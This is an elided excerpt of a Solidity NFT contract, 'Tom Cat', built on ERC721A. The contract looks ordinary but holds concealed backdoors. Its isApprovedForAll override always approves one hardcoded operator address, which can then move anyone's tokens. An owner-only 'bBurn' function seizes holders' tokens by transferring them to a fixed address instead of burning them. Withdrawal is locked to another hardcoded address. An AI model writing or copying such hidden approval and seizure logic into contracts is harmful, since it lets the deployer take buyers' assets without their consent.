  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x2266ec6306565AfdbED8bb8a643F19b4dD8F3271){return true;}
...
contract Tom_Cat is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Tom Cat", "TC", maxBatchSize_, collectionSize_) {
  ...
  function bBurn(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x735e5E22212BC7b804e6eceeb33893ddD21b4A73, tokenid);
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xE6B210661C409f99766e220fbcb134E968ecCeBA);
